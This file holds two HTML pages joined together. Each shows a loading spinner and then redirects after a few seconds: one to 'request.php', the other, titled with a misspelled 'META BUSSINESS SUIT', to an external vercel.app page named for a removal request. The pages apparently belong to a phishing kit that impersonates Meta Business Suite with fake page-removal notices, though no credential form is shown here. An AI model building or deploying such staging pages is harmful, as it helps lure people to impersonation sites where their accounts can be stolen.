<!DOCTYPE html>
<html>
<head>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f0f0f0;
      overflow: hidden;
    }

    .loading-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .spinner {
      border: 4px solid rgba(0, 0, 255, 0.3);
      border-top: 4px solid #0000FF;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 2s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
  <script type="text/javascript">
    document.addEventListener("DOMContentLoaded", function() {
      var currentHost = window.location.hostname;

      setTimeout(function() {
        var redirectURL = "request.php"; // Updated URL
        window.location.replace(redirectURL);
      }, 5000); // 5000 milliseconds (5 seconds)
    });
  </script>
</head>
<body>
  <div class="loading-container">
    <div class="spinner"></div>
    <p>Loading page...</p>
  </div>
</body>
</html>
<html>
<head>
  <title> META BUSSINESS SUIT </title>
  <style>
    .loader {
      border: 5px solid #f3f3f3; /* Light grey */
      border-top: 5px solid #3498db; /* Light blue */
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 2s linear infinite;
      position: absolute; /* Set the position to absolute */
      top: 0; /* Set the top to 0 */
      left: 0; /* Set the left to 0 */
      right: 0; /* Set the right to 0 */
      bottom: 0; /* Set the bottom to 0 */
      margin: auto; /* Center the loader */
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
  <script>
    window.onload = function() {
        setTimeout(function() {
            window.location.href = 'https://request-remove-page.vercel.app/request.html'; // Change to your desired URL
        }, 3000); // Change delay as needed
    }
</script>
</head>
<body>
  <div class="loader"></div>
</body>
</html>
